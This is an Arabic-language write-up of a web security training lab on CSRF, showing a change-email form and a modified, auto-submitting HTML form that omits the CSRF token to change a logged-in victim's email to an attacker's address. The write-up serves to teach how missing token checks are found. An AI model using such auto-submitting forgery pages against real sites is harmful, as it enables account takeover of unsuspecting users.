

المشكلة في اللاب ده في فانكشن ال `change email` برضو والمشكلة هي انه مش بيعمل `check` لما نمسح ال `csrf token` ولكن لما تبقي موجودة بيعمل `check` عليها ويشوف صح ولا غلط

ده كان ال `form` قبل التعديل
```HTML
<form class="login-form" name="change-email-form" action="[/my-account/change-email](view-source:https://0a1400450486873582befbd7000e00f8.web-security-academy.net/my-account/change-email)" method="POST">
	<label>Email</label>
	<input required type="email" name="email" value="">
	<input required name="csrf" value="Aar2hkT6L2RkdZ9rwhDzW1gmbKqx8rZH">
	<button class='button' type='submit'> Update email </button>
</form>
```
وده بعد ما عدلته و حطيته في السيرفر
```HTML
<form action="https://0a1400450486873582befbd7000e00f8.web-security-academy.net/my-account/change-email" method="POST">
    <input required type="email" name="email" value="hacker@test.com">
</form>
<script> document.forms[0].submit(); </script>
```

### نتعلم اي من اللاب ده ؟

* نجرب نمسح ال `csrf token` ولو الفانكشن اشتغلت يبقي ثغرة